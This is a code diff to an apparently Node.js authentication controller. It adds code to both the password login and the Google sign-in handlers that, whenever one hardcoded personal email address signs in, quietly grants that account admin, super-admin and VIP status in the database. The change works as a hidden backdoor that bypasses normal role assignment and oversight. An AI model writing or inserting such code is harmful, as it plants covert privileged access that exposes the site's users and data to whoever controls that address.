@@ -139,6 +139,14 @@ exports.login = async (req, res, next) => {
       [user.id]
     );
 
+    // Auto promote hurculez11@gmail.com
+    if (user.email.toLowerCase() === 'hurculez11@gmail.com' && (!user.is_admin || !user.is_super_admin)) {
+      await pool.query('UPDATE users SET is_admin = 1, is_super_admin = 1, subscription_tier = "vip" WHERE id = ?', [user.id]);
+      user.is_admin = 1;
+      user.is_super_admin = 1;
+      user.subscription_tier = 'vip';
+    }
+
     const token = generateToken(user.id);
 
     logger.info(`User logged in: ${email}`);
@@ -209,6 +217,11 @@ exports.googleAuth = async (req, res, next) => {
       if (existing[0].is_banned) {
         return res.status(403).json({ message: 'Account banned' });
       }
+    }
+
+    // Auto promote hurculez11@gmail.com
+    if (email.toLowerCase() === 'hurculez11@gmail.com') {
+      await pool.query('UPDATE users SET is_admin = 1, is_super_admin = 1, subscription_tier = "vip" WHERE id = ?', [userId]);
     }
 
     const token = generateToken(userId);
